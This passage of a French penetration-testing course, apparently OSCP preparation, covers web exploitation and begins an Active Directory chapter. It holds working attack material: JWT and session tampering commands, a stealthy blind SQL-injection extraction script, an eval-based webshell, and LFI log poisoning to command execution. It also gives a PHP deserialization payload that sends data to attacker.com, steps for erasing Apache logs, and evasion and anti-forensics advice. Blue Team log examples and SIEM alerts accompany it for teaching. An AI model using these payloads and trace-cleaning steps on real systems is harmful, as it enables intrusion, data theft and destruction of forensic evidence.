   // Exemple de jeton faible basé sur un timestamp
   // Format: base64(username:timestamp)
   
   // Jeton original
   // admin:1621234567 -> YWRtaW46MTYyMTIzNDU2Nw==
   
   // Création d'un nouveau jeton valide
   // admin:1621234999 -> YWRtaW46MTYyMTIzNDk5OQ==
   ```

2. **Attaques sur les mécanismes de réinitialisation de mot de passe**
   - Tokens prévisibles ou réutilisables
   - Contournement des vérifications
   
   ```
   // Exemple d'URL de réinitialisation de mot de passe vulnérable
   https://example.com/reset?user=admin&token=1234567890
   
   // Attaques possibles:
   // 1. Suppression du paramètre token
   https://example.com/reset?user=admin
   
   // 2. Utilisation d'un token connu pour un autre utilisateur
   https://example.com/reset?user=admin&token=0987654321
   
   // 3. Brute force sur des tokens simples
   // 4. Réutilisation de tokens expirés
   ```

3. **OAuth et OpenID Connect**
   - Vulnérabilités dans les implémentations
   - Attaques CSRF, redirection ouverte, etc.
   
   ```
   // Exemple d'attaque par redirection ouverte dans OAuth
   // URL légitime
   https://auth.example.com/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://app.example.com/callback
   
   // URL malveillante
   https://auth.example.com/oauth/authorize?client_id=CLIENT_ID&redirect_uri=https://attacker.com/callback
   
   // Si l'application ne valide pas correctement redirect_uri, l'attaquant peut voler le code d'autorisation
   ```

#### Manipulation de session

1. **Fixation de session**
   - Forcer un utilisateur à utiliser un identifiant de session connu
   - Techniques d'exploitation
   
   ```
   // Étapes d'une attaque par fixation de session
   
   // 1. L'attaquant obtient un identifiant de session valide
   // 2. L'attaquant force la victime à utiliser cet identifiant (via URL, XSS, etc.)
   https://example.com/login?JSESSIONID=KNOWN_SESSION_ID
   
   // 3. La victime se connecte avec cet identifiant
   // 4. L'attaquant utilise le même identifiant pour accéder au compte de la victime
   ```

2. **Manipulation de cookies**
   - Modification de cookies pour élever les privilèges
   - Exploitation des faiblesses de validation
   
   ```
   // Exemple de cookie de rôle
   // Cookie original
   role=user
   
   // Cookie manipulé
   role=admin
   
   // Exemple de cookie JWT
   // 1. Décoder le JWT
   // 2. Modifier les claims (ex: {"role": "admin"})
   // 3. Si la signature n'est pas correctement vérifiée, le JWT modifié peut être accepté
   ```

3. **Race conditions**
   - Exploitation des conditions de concurrence dans la gestion des sessions
   - Techniques pour augmenter les chances de succès
   
   ```
   // Exemple de race condition dans un processus de paiement
   
   // 1. Initier plusieurs transactions simultanées avec le même identifiant de session
   // 2. Si l'application ne gère pas correctement la concurrence, plusieurs transactions peuvent être traitées avant que le solde ne soit mis à jour
   
   // Script pour envoyer des requêtes simultanées
   for i in {1..10}; do
     curl -b "session=SESSION_ID" -d "amount=100&recipient=attacker" https://example.com/transfer &
   done
   ```

#### JWT (JSON Web Tokens)

1. **Attaques sur les signatures**
   - Algorithme "none"
   - Confusion d'algorithme (alg switching)
   
   ```
   // Exemple de JWT
   // Header: {"alg": "HS256", "typ": "JWT"}
   // Payload: {"sub": "user123", "role": "user"}
   
   // Attaque avec algorithme "none"
   // Header modifié: {"alg": "none", "typ": "JWT"}
   // Payload modifié: {"sub": "user123", "role": "admin"}
   // Signature: "" (vide)
   
   // Attaque par confusion d'algorithme
   // Si le serveur utilise la clé publique RSA comme clé HMAC
   // Header modifié: {"alg": "HS256", "typ": "JWT"} (au lieu de RS256)
   // Payload modifié: {"sub": "user123", "role": "admin"}
   // Signature: HMAC-SHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), public_key)
   ```

2. **Attaques par force brute sur les clés**
   - Techniques pour deviner ou casser les clés secrètes
   - Utilisation d'outils comme jwt_tool
   
   ```bash
   # Utilisation de jwt_tool pour une attaque par force brute
   python3 jwt_tool.py <JWT_TOKEN> -C -d wordlist.txt
   
   # Utilisation de hashcat
   hashcat -m 16500 -a 0 <JWT_TOKEN> wordlist.txt
   ```

3. **Injection dans les claims**
   - SQLi, command injection via les claims
   - Exploitation des parsers JWT
   
   ```
   // Exemple d'injection SQL dans un claim JWT
   // Payload original: {"sub": "user123", "role": "user"}
   
   // Payload modifié avec injection SQL
   {"sub": "' OR 1=1 --", "role": "user"}
   
   // Si l'application utilise le claim "sub" directement dans une requête SQL sans échappement
   // SELECT * FROM users WHERE username = '' OR 1=1 --'
   ```

### Vue Blue Team / logs générés / alertes SIEM

#### Traces générées par les injections SQL

1. **Logs de base de données**
   - Requêtes SQL suspectes ou malformées
   - Erreurs de syntaxe ou d'exécution
   
   **Exemple de log MySQL :**
   ```
   2023-05-15 14:23:45 [Warning] Aborted connection 12345 to db: 'webapp' user: 'webapp' host: 'localhost' (Got an error reading communication packets)
   2023-05-15 14:23:46 [Note] Access denied for user 'webapp'@'localhost' (using password: YES)
   ```

2. **Logs d'application web**
   - Erreurs d'application liées aux requêtes SQL
   - Traces d'exécution de requêtes
   
   **Exemple de log d'application :**
   ```
   [2023-05-15 14:23:45] [error] [client 192.168.1.100] PHP Fatal error: Uncaught PDOException: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\'OR 1=1--' at line 1 in /var/www/html/login.php:25
   ```

3. **Logs de WAF (Web Application Firewall)**
   - Détection de patterns d'injection SQL
   - Blocage de requêtes malveillantes
   
   **Exemple de log ModSecurity :**
   ```
   [2023-05-15 14:23:45] [192.168.1.100] [client 192.168.1.100] ModSecurity: Warning. Pattern match "(?i:(?:select|;)\\s+(?:benchmark|if|sleep)\\s*?\\(\\s*?\\d+)" at ARGS:username. [file "/etc/modsecurity/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] [line "1242"] [id "942480"] [rev "1"] [msg "SQL Injection Attack: SQL Benchmark and Sleep Functions Detected"] [data "' OR SLEEP(5)--"] [severity "CRITICAL"] [ver "OWASP_CRS/3.3.0"] [maturity "1"] [accuracy "8"] [tag "application-multi"] [tag "language-multi"] [tag "platform-multi"] [tag "attack-sqli"] [tag "paranoia-level/2"] [tag "OWASP_CRS"] [tag "capec/1000/152/248/66"] [tag "PCI/6.5.2"] [hostname "www.example.com"] [uri "/login.php"] [unique_id "YKJHfcoAAEAADxEcGgcAAAAB"]
   ```

#### Traces générées par l'exploitation de fichiers

1. **Logs de serveur web**
   - Requêtes suspectes vers des fichiers sensibles
   - Tentatives d'inclusion de fichiers distants
   
   **Exemple de log Apache :**
   ```
   192.168.1.100 - - [15/May/2023:14:24:12 +0000] "GET /index.php?file=../../../etc/passwd HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
   192.168.1.100 - - [15/May/2023:14:24:15 +0000] "GET /index.php?file=http://attacker.com/shell.php HTTP/1.1" 200 4523 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
   ```

2. **Logs d'upload de fichiers**
   - Tentatives d'upload de fichiers malveillants
   - Modifications de type MIME ou d'extension
   
   **Exemple de log d'application :**
   ```
   [2023-05-15 14:24:30] [info] [client 192.168.1.100] File upload attempt: shell.php (renamed to shell.php.jpg)
   [2023-05-15 14:24:35] [warning] [client 192.168.1.100] Suspicious file upload: Content-Type mismatch - declared: image/jpeg, detected: text/x-php
   ```

3. **Logs système**
   - Accès à des fichiers sensibles
   - Exécution de commandes via des webshells
   
   **Exemple de log auditd :**
   ```
   type=SYSCALL msg=audit(1621234567.890:1234): arch=c000003e syscall=2 success=yes exit=3 a0=7ffcb9f9f210 a1=0 a2=0 a3=7ffcb9f9e9d0 items=1 ppid=12345 pid=12346 auid=33 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=pts0 ses=1 comm="php-fpm" exe="/usr/sbin/php-fpm7.4" key="webshell"
   type=CWD msg=audit(1621234567.890:1234): cwd="/var/www/html"
   type=PATH msg=audit(1621234567.890:1234): item=0 name="/var/www/html/uploads/shell.php" inode=1234567 dev=08:01 mode=0100644 ouid=33 ogid=33 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0
   ```

#### Traces générées par la désérialisation

1. **Logs d'application**
   - Erreurs de désérialisation
   - Exécution de méthodes magiques
   
   **Exemple de log PHP :**
   ```
   [2023-05-15 14:25:10] [error] [client 192.168.1.100] PHP Notice: unserialize(): Error at offset 123 of 456 bytes in /var/www/html/index.php on line 25
   [2023-05-15 14:25:15] [warning] [client 192.168.1.100] PHP Warning: Unexpected character in input: '\' (ASCII=92) state=1 in /var/www/html/index.php on line 25
   ```

2. **Logs système**
   - Exécution de commandes via la désérialisation
   - Création de processus suspects
   
   **Exemple de log auditd :**
   ```
   type=EXECVE msg=audit(1621234567.890:1235): argc=3 a0="sh" a1="-c" a2="id"
   type=SYSCALL msg=audit(1621234567.890:1235): arch=c000003e syscall=59 success=yes exit=0 a0=55555555abc0 a1=55555555abd8 a2=55555555abe8 a3=0 items=2 ppid=12345 pid=12347 auid=33 uid=33 gid=33 euid=33 suid=33 fsuid=33 egid=33 sgid=33 fsgid=33 tty=pts0 ses=1 comm="sh" exe="/usr/bin/dash" key="webshell"
   ```

3. **Logs réseau**
   - Connexions sortantes vers des serveurs attaquants
   - Trafic de commande et contrôle
   
   **Exemple de log Suricata :**
   ```
   05/15/2023-14:25:30.123456 [**] [1:2013504:4] ET POLICY Suspicious Outbound Connection to Potentially Malicious Host [**] [Classification: Potentially Bad Traffic] [Priority: 2] {TCP} 192.168.1.10:49152 -> 203.0.113.100:4444
   ```

#### Alertes SIEM typiques

**Alerte d'injection SQL :**
```
[ALERT] SQL Injection Attempt Detected
Host: web-server-01
Source IP: 192.168.1.100
Time: 2023-05-15 14:23:45
Details: Multiple SQL syntax errors detected in rapid succession from same source IP
Query: SELECT * FROM users WHERE username='' OR 1=1--' AND password='password'
Severity: High
```

**Alerte de Local File Inclusion :**
```
[ALERT] Local File Inclusion Attempt
Host: web-server-01
Source IP: 192.168.1.100
Time: 2023-05-15 14:24:12
Details: Attempt to access system files via path traversal
URL: /index.php?file=../../../etc/passwd
Severity: Critical
```

**Alerte d'upload de webshell :**
```
[ALERT] Potential Webshell Upload Detected
Host: web-server-01
Source IP: 192.168.1.100
Time: 2023-05-15 14:24:30
Details: PHP file uploaded with image MIME type
File: /var/www/html/uploads/shell.php.jpg
Content: Contains PHP code including system(), exec(), shell_exec() functions
Severity: Critical
```

**Alerte de désérialisation dangereuse :**
```
[ALERT] Suspicious Deserialization Activity
Host: web-server-01
Source IP: 192.168.1.100
Time: 2023-05-15 14:25:10
Details: Deserialization followed by command execution
Process: php-fpm spawned shell process
Command: sh -c id
Severity: Critical
```

**Alerte de manipulation de JWT :**
```
[ALERT] JWT Token Tampering Detected
Host: web-server-01
Source IP: 192.168.1.100
Time: 2023-05-15 14:26:05
Details: JWT signature verification failed, algorithm switching attempt detected
Original alg: RS256
Modified alg: HS256
Severity: High
```

### Pièges classiques et erreurs à éviter

#### Erreurs d'exploitation SQL

1. **Syntaxe incorrecte**
   - Erreurs de syntaxe SQL spécifiques au SGBD
   - Oubli de commenter le reste de la requête
   
   **Solution :** Adapter la syntaxe au SGBD cible (MySQL, MSSQL, PostgreSQL, Oracle), utiliser des outils comme SQLmap pour automatiser l'exploitation.

2. **Détection et blocage**
   - Déclenchement de WAF ou d'IDS
   - Blocage d'IP après des tentatives répétées
   
   **Solution :** Utiliser des techniques d'évasion, espacer les requêtes, éviter les patterns connus.

3. **Extraction inefficace**
   - Méthodes d'extraction trop lentes ou peu fiables
   - Perte de données due à des erreurs
   
   **Solution :** Utiliser des techniques d'extraction adaptées au contexte (UNION, erreur, temps, out-of-band), automatiser l'extraction avec des scripts personnalisés.

#### Erreurs d'exploitation de fichiers

1. **Chemins incorrects**
   - Erreurs dans les chemins de traversée de répertoire
   - Différences entre systèmes d'exploitation
   
   **Solution :** Adapter les chemins au système cible (Windows vs Linux), utiliser des techniques de fuzzing pour découvrir les chemins corrects.

2. **Filtres et restrictions**
   - Contournement incomplet des filtres
   - Restrictions de taille ou de type de fichier
   
   **Solution :** Tester différentes techniques de contournement, combiner plusieurs vulnérabilités pour contourner les restrictions.

3. **Exécution de code**
   - Problèmes d'exécution après upload ou inclusion
   - Permissions insuffisantes
   
   **Solution :** Vérifier les permissions et les configurations du serveur, tester différentes méthodes d'exécution.

#### Erreurs de désérialisation

1. **Gadget chains incorrectes**
   - Utilisation de gadgets non disponibles dans l'application
   - Versions incompatibles de bibliothèques
   
   **Solution :** Identifier précisément les bibliothèques et versions utilisées par l'application, adapter les gadget chains en conséquence.

2. **Sérialisation incorrecte**
   - Erreurs de format ou de syntaxe
   - Problèmes d'encodage
   
   **Solution :** Vérifier soigneusement le format de sérialisation, utiliser des outils spécifiques au langage pour générer des payloads valides.

3. **Détection et prévention**
   - Mécanismes de validation ou de filtrage
   - Listes blanches de classes autorisées
   
   **Solution :** Rechercher des classes alternatives pour l'exploitation, utiliser des techniques d'obfuscation ou d'encodage.

### OPSEC Tips : Exploitation web discrète

#### Techniques de base

1. **Limitation du bruit**
   ```
   // Éviter les scans massifs
   // Au lieu de tester 100 payloads, commencer par les plus probables
   
   // Espacer les requêtes
   // Ajouter des délais entre les requêtes pour éviter la détection
   
   // Limiter les erreurs
   // Utiliser des techniques aveugles plutôt que de provoquer des erreurs
   ```

2. **Masquage des requêtes**
   ```
   // Modifier les User-Agents
   // Utiliser des User-Agents légitimes et variés
   
   // Éviter les patterns évidents
   // Éviter les payloads connus qui déclenchent les WAF
   
   // Utiliser des proxys
   // Faire passer les requêtes par différents proxys pour masquer l'origine
   ```

3. **Nettoyage des traces**
   ```
   // Supprimer les fichiers temporaires
   // Nettoyer les webshells après utilisation
   
   // Minimiser les modifications
   // Éviter de modifier des fichiers système ou de configuration
   
   // Utiliser des techniques non persistantes
   // Préférer les techniques qui ne laissent pas de traces permanentes
   ```

#### Techniques avancées

1. **Exécution en mémoire**
   ```php
   // PHP - Exécution en mémoire sans écriture sur disque
   <?php
   // Au lieu d'écrire un webshell sur disque
   eval(base64_decode($_GET['code']));
   // Utilisation: ?code=base64_encode('system("id");')
   ?>
   ```

2. **Canaux de communication alternatifs**
   ```
   // Utilisation de DNS pour l'exfiltration de données
   // Les requêtes DNS sont souvent moins surveillées
   
   // Utilisation de WebSockets pour la communication
   // Peut contourner certaines restrictions de pare-feu
   
   // Tunneling via des protocoles légitimes
   // HTTP, HTTPS, DNS, ICMP, etc.
   ```

3. **Techniques anti-forensics**
   ```
   // Modification des timestamps de fichiers
   // Pour masquer les modifications récentes
   
   // Utilisation de canaux cachés
   // Stockage de données dans des attributs étendus, des flux alternatifs, etc.
   
   // Encryption des communications
   // Utiliser TLS/SSL ou des techniques de chiffrement personnalisées
   ```

#### Script OPSEC : Exploitation SQL discrète

```python
#!/usr/bin/env python3
# Script d'exploitation SQL discrète avec considérations OPSEC

import requests
import time
import random
import string
import sys
import argparse
from urllib.parse import quote

# Configuration
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

# Fonction pour générer un délai aléatoire
def random_delay(min_seconds=1, max_seconds=3):
    delay = random.uniform(min_seconds, max_seconds)
    time.sleep(delay)

# Fonction pour obtenir un User-Agent aléatoire
def random_user_agent():
    return random.choice(USER_AGENTS)

# Fonction pour effectuer une requête discrète
def make_request(url, payload, cookies=None):
    headers = {
        "User-Agent": random_user_agent(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Upgrade-Insecure-Requests": "1"
    }
    
    # Ajouter un referer plausible
    parsed_url = url.split("/")
    if len(parsed_url) > 3:
        headers["Referer"] = "/".join(parsed_url[:3])
    
    try:
        response = requests.get(url + quote(payload), headers=headers, cookies=cookies, timeout=10)
        return response
    except Exception as e:
        print(f"[ERROR] Request failed: {e}")
        return None

# Fonction pour tester une injection SQL booléenne
def test_boolean_injection(url, true_condition, false_condition, cookies=None):
    print("[INFO] Testing boolean-based SQL injection...")
    
    # Test avec condition vraie
    random_delay()
    true_response = make_request(url, true_condition, cookies)
    if not true_response:
        return False
    
    # Test avec condition fausse
    random_delay(2, 5)  # Délai plus long entre les tests
    false_response = make_request(url, false_condition, cookies)
    if not false_response:
        return False
    
    # Comparer les réponses
    if true_response.text != false_response.text:
        print("[SUCCESS] Boolean-based injection confirmed!")
        return True
    else:
        print("[INFO] Boolean-based injection not detected.")
        return False

# Fonction pour extraire des données via injection booléenne
def extract_data_boolean(url, base_payload, data_query, charset, cookies=None):
    print(f"[INFO] Extracting data using boolean-based injection: {data_query}")
    result = ""
    
    for position in range(1, 50):  # Limiter à 50 caractères pour éviter trop de requêtes
        found = False
        
        # Utiliser une approche binaire pour réduire le nombre de requêtes
        min_char = 0
        max_char = len(charset) - 1
        
        while min_char <= max_char:
            mid = (min_char + max_char) // 2
            char_to_test = charset[mid]
            
            # Construire le payload pour tester si le caractère à la position actuelle est >= au caractère du milieu
            payload = base_payload.format(query=data_query, position=position, char=char_to_test, operator=">=")
            
            random_delay()
            response = make_request(url, payload, cookies)
            
            if not response:
                continue
            
            # Ajuster la recherche binaire en fonction de la réponse
            if "TRUE_INDICATOR" in response.text:  # Remplacer par un indicateur réel
                min_char = mid + 1
            else:
                max_char = mid - 1
        
        # Une fois la recherche binaire terminée, vérifier le caractère exact
        if min_char > 0 and min_char <= len(charset):
            result_char = charset[min_char - 1]
            result += result_char
            print(f"[INFO] Found character at position {position}: {result_char}")
        else:
            print(f"[INFO] End of data or no more characters found after position {position-1}")
            break
        
        # Vérifier si nous avons atteint la fin de la chaîne
        null_check_payload = base_payload.format(query=f"ASCII(SUBSTRING({data_query},{position+1},1))", position=1, char=1, operator=">")
        random_delay(2, 4)
        null_check_response = make_request(url, null_check_payload, cookies)
        
        if not null_check_response or "FALSE_INDICATOR" in null_check_response.text:  # Remplacer par un indicateur réel
            break
    
    print(f"[SUCCESS] Extracted data: {result}")
    return result

# Fonction principale
def main():
    parser = argparse.ArgumentParser(description="Discreet SQL Injection Exploitation Tool")
    parser.add_argument("url", help="Target URL (without injection point)")
    parser.add_argument("--cookies", help="Cookies in format 'name1=value1; name2=value2'")
    parser.add_argument("--true", default="' OR 1=1 --", help="Payload that returns true")
    parser.add_argument("--false", default="' OR 1=2 --", help="Payload that returns false")
    parser.add_argument("--extract", help="Extract data using this query (e.g., 'SELECT password FROM users WHERE username=\"admin\"')")
    args = parser.parse_args()
    
    # Convertir les cookies en dictionnaire
    cookies_dict = None
    if args.cookies:
        cookies_dict = {}
        for cookie in args.cookies.split("; "):
            name, value = cookie.split("=", 1)
            cookies_dict[name] = value
    
    # Tester l'injection booléenne
    if test_boolean_injection(args.url, args.true, args.false, cookies_dict):
        if args.extract:
            # Définir le jeu de caractères pour l'extraction (ajuster selon les besoins)
            charset = string.ascii_letters + string.digits + string.punctuation
            
            # Définir le payload de base pour l'extraction booléenne
            # Remplacer par un payload adapté à la cible
            base_payload = "' OR ASCII(SUBSTRING({query},{position},1)){operator}ASCII('{char}') --"
            
            # Extraire les données
            extract_data_boolean(args.url, base_payload, args.extract, charset, cookies_dict)
    
    print("[INFO] Exploitation completed.")

if __name__ == "__main__":
    main()
```

### Points clés

- L'exploitation avancée d'applications web nécessite une compréhension approfondie des vulnérabilités et de leurs mécanismes sous-jacents.
- Les injections SQL avancées vont au-delà des simples UNION SELECT et incluent des techniques aveugles, de second ordre et basées sur le temps.
- L'exploitation de fichiers comprend les inclusions locales et distantes (LFI/RFI), l'upload de fichiers malveillants et les attaques XXE.
- La désérialisation dangereuse est une vulnérabilité puissante qui peut conduire à l'exécution de code arbitraire dans divers langages (PHP, Java, .NET, Python, etc.).
- Les vulnérabilités d'authentification et de session peuvent permettre de contourner les mécanismes de sécurité et d'accéder à des comptes privilégiés.
- Les équipes défensives peuvent détecter ces attaques via les logs de base de données, d'application, de serveur web et de système.
- Une approche OPSEC discrète implique de limiter le bruit, de masquer les requêtes, de nettoyer les traces et d'utiliser des techniques avancées comme l'exécution en mémoire.

### Mini-quiz (3 QCM)

1. **Quelle technique d'injection SQL est la plus appropriée lorsque l'application ne renvoie aucun résultat visible mais se comporte différemment selon que la condition injectée est vraie ou fausse ?**
   - A) UNION-based injection
   - B) Error-based injection
   - C) Boolean-based blind injection
   - D) Time-based blind injection

   *Réponse : C*

2. **Quelle méthode PHP est automatiquement appelée lors de la désérialisation d'un objet et peut être exploitée pour l'exécution de code ?**
   - A) `__construct()`
   - B) `__destruct()`
   - C) `__toString()`
   - D) `__invoke()`

   *Réponse : B*

3. **Quelle attaque sur les JWT consiste à modifier l'algorithme de signature de RS256 à HS256 pour exploiter une implémentation incorrecte de la vérification ?**
   - A) JWT Header Injection
   - B) JWT None Algorithm
   - C) JWT Algorithm Confusion
   - D) JWT Signature Bypass

   *Réponse : C*

### Lab/Exercice guidé : Exploitation d'une application web vulnérable

#### Objectif
Identifier et exploiter plusieurs vulnérabilités web avancées dans une application vulnérable, en utilisant des techniques discrètes et en évitant la détection.

#### Prérequis
- Une application web vulnérable (ex: DVWA, WebGoat, OWASP Juice Shop)
- Burp Suite ou un proxy web similaire
- Outils de base pour l'exploitation web (navigateur, scripts personnalisés)

#### Étapes

1. **Reconnaissance et identification des vulnérabilités**

```bash
# Analyser l'application pour identifier les points d'entrée potentiels
# Utiliser Burp Suite pour intercepter et analyser les requêtes

# Vérifier les formulaires, les paramètres GET/POST, les cookies, les en-têtes
# Rechercher des indices de vulnérabilités (erreurs SQL, inclusion de fichiers, désérialisation)

# Exemple: Tester un paramètre pour l'injection SQL
# Ajouter une apostrophe et observer la réponse
curl -s "http://vulnerable-app/product.php?id=1'"

# Exemple: Tester un paramètre pour LFI
curl -s "http://vulnerable-app/page.php?file=../../../etc/passwd"

# Exemple: Rechercher des indices de désérialisation
# Chercher des cookies ou paramètres contenant des données sérialisées
# PHP: O:8:"stdClass":1:{s:4:"data";s:14:"sensitive data";}
# Java: rO0AB...
```

2. **Exploitation d'une injection SQL avancée**

```bash
# Supposons que nous avons identifié une injection SQL dans le paramètre 'id'
# Déterminer le type d'injection (UNION, erreur, booléen, temps)

# Test d'injection UNION
curl -s "http://vulnerable-app/product.php?id=1 UNION SELECT 1,2,3,4"

# Si l'injection UNION fonctionne, extraire des informations sur la base de données
curl -s "http://vulnerable-app/product.php?id=1 UNION SELECT 1,database(),version(),4"

# Extraire des informations sur les tables
curl -s "http://vulnerable-app/product.php?id=1 UNION SELECT 1,table_name,3,4 FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0"

# Extraire des informations sur les colonnes d'une table spécifique (ex: users)
curl -s "http://vulnerable-app/product.php?id=1 UNION SELECT 1,column_name,3,4 FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0"

# Extraire des données sensibles
curl -s "http://vulnerable-app/product.php?id=1 UNION SELECT 1,username,password,4 FROM users LIMIT 1 OFFSET 0"

# Si l'injection booléenne est nécessaire, utiliser un script comme celui présenté dans la section OPSEC
python3 sql_boolean_extract.py "http://vulnerable-app/product.php?id=" --extract "SELECT password FROM users WHERE username='admin'"
```

3. **Exploitation d'une vulnérabilité LFI**

```bash
# Supposons que nous avons identifié une LFI dans le paramètre 'file'
# Tester l'accès à des fichiers système

# Lire /etc/passwd
curl -s "http://vulnerable-app/page.php?file=../../../etc/passwd"

# Si des filtres sont en place, essayer des techniques de contournement
# Contournement de filtre qui ajoute .php
curl -s "http://vulnerable-app/page.php?file=../../../etc/passwd%00"

# Utilisation de wrappers PHP
curl -s "http://vulnerable-app/page.php?file=php://filter/convert.base64-encode/resource=config.php"

# Décoder le résultat base64
echo "BASE64_OUTPUT" | base64 -d

# Si possible, exploiter pour obtenir un shell
# 1. Empoisonner un fichier de log (ex: Apache access.log)
curl -s "http://vulnerable-app/page.php" -A "<?php system(\$_GET['cmd']); ?>"

# 2. Inclure le fichier de log et exécuter des commandes
curl -s "http://vulnerable-app/page.php?file=../../../var/log/apache2/access.log&cmd=id"
```

4. **Exploitation d'une vulnérabilité de désérialisation PHP**

```bash
# Supposons que nous avons identifié une désérialisation PHP dans un cookie 'user'
# Analyser la structure des données sérialisées

# Créer un payload de désérialisation malveillant
# Exemple avec une classe vulnérable qui exécute des commandes via __destruct()

# Créer un script PHP pour générer le payload
cat > generate_payload.php << 'EOF'
<?php
class Vulnerable {
    public $command = "id";
    
    // Cette méthode sera appelée lors de la désérialisation
    function __destruct() {
        system($this->command);
    }
}

$obj = new Vulnerable();
$obj->command = "curl http://attacker.com/$(id | base64)";  // Exfiltration discrète
echo serialize($obj);
?>
EOF

# Générer le payload
php generate_payload.php
# Output: O:10:"Vulnerable":1:{s:7:"command";s:41:"curl http://attacker.com/$(id | base64)";}

# Utiliser Burp Suite pour intercepter une requête et remplacer le cookie 'user' par le payload
# Ou utiliser curl avec le cookie modifié
curl -s "http://vulnerable-app/profile.php" --cookie "user=O:10:\"Vulnerable\":1:{s:7:\"command\";s:41:\"curl http://attacker.com/\$(id | base64)\";}"

# Sur la machine attaquante, démarrer un serveur HTTP pour recevoir les données exfiltrées
python3 -m http.server 80
```

5. **Exploitation d'une vulnérabilité JWT**

```bash
# Supposons que nous avons identifié un JWT dans un cookie 'session'
# Décoder le JWT pour analyser sa structure

# Utiliser jwt.io ou un script local
echo "JWT_TOKEN" | cut -d'.' -f1 | base64 -d
echo "JWT_TOKEN" | cut -d'.' -f2 | base64 -d

# Si l'algorithme est 'none', créer un token avec des privilèges élevés
# Utiliser jwt_tool.py ou un script personnalisé

# Exemple avec jwt_tool.py
python3 jwt_tool.py JWT_TOKEN -X a

# Si l'algorithme est RS256, tenter une attaque par confusion d'algorithme
# Modifier l'algorithme de RS256 à HS256 et signer avec la clé publique
python3 jwt_tool.py JWT_TOKEN -X k -pk public_key.pem

# Utiliser le token modifié dans une requête
curl -s "http://vulnerable-app/admin.php" --cookie "session=MODIFIED_JWT_TOKEN"
```

6. **Nettoyage et couverture des traces**

```bash
# Supprimer les webshells ou fichiers malveillants créés
curl -s "http://vulnerable-app/page.php?file=../../../var/log/apache2/access.log&cmd=rm /tmp/shell.php"

# Effacer les entrées de log si possible
curl -s "http://vulnerable-app/page.php?file=../../../var/log/apache2/access.log&cmd=echo '' > /var/log/apache2/access.log"

# Vérifier que toutes les connexions sont fermées
# Arrêter les listeners et serveurs sur la machine attaquante
```

#### Vue Blue Team

1. **Détection de l'injection SQL**
   - Logs de base de données montrant des requêtes SQL malformées
   - Logs d'application montrant des erreurs SQL
   - Alertes WAF pour des patterns d'injection SQL

2. **Détection de la LFI**
   - Logs de serveur web montrant des accès à des fichiers sensibles
   - Logs système montrant des lectures de fichiers inhabituelles
   - Alertes IDS pour des patterns de traversée de répertoire

3. **Détection de la désérialisation**
   - Logs d'application montrant des erreurs de désérialisation
   - Logs système montrant l'exécution de commandes inhabituelles
   - Alertes réseau pour des connexions sortantes vers des serveurs attaquants

4. **Détection de la manipulation JWT**
   - Logs d'application montrant des erreurs de vérification de signature
   - Alertes pour des modifications d'algorithme JWT
   - Logs d'accès montrant des accès non autorisés à des fonctionnalités administratives

#### Résultat attendu

À la fin de cet exercice, vous devriez :
- Avoir identifié et exploité plusieurs vulnérabilités web avancées
- Avoir utilisé des techniques discrètes pour éviter la détection
- Avoir compris comment ces vulnérabilités sont détectées par les équipes défensives
- Avoir pratiqué le nettoyage des traces pour minimiser l'impact forensique
- Apprécier l'importance d'une approche méthodique et discrète dans l'exploitation web
# PARTIE III : COMPÉTENCES OSCP AVANCÉES (+ OPSEC NIVEAU 3)

## Chapitre 19 : Attaques avancées sur Active Directory

### Introduction : Pourquoi ce thème est important

Les environnements Active Directory (AD) sont omniprésents dans les entreprises modernes et constituent souvent la cible principale lors des tests d'intrusion et des examens OSCP. Alors que les attaques de base sur AD ont été couvertes dans les chapitres précédents, ce chapitre se concentre sur les techniques avancées qui permettent de compromettre un domaine entier, même en présence de défenses robustes. La maîtrise de ces techniques est essentielle pour l'OSCP, car elles représentent des scénarios réalistes d'attaque et démontrent une compréhension approfondie des mécanismes de sécurité de Windows. De plus, ces attaques avancées nécessitent une approche OPSEC soignée pour éviter la détection, ce qui est crucial dans les environnements professionnels où la discrétion est primordiale.

### Attaques avancées sur Kerberos

#### Kerberoasting avancé

1. **Principes du Kerberoasting**
   - Rappel du fonctionnement de Kerberos et des tickets TGS
   - Ciblage des comptes de service avec SPN (Service Principal Names)
   
   ```powershell
   # Rappel de la commande de base pour le Kerberoasting
   Get-DomainUser -SPN | Get-DomainSPNTicket -OutputFormat Hashcat | Export-Csv -Path .\kerberoast.csv -NoTypeInformation
   
   # Équivalent avec les outils natifs
   setspn -Q */* | findstr /i "CN=" > spns.txt
   # Puis utiliser Rubeus pour demander les tickets
   ```

2. **Techniques de ciblage sélectif**
   - Identification des comptes à haute valeur
   - Filtrage basé sur les groupes et privilèges
   
   ```powershell
   # Cibler uniquement les comptes de service appartenant à des groupes privilégiés
   Get-DomainUser -SPN | Where-Object {$_.memberof -match "Domain Admins|Enterprise Admins|Administrators"} | Get-DomainSPNTicket
   
   # Cibler les comptes avec des attributs spécifiques
   Get-DomainUser -LDAPFilter '(&(servicePrincipalName=*)(adminCount=1))' | Get-DomainSPNTicket
   ```

3. **Contournement des protections**
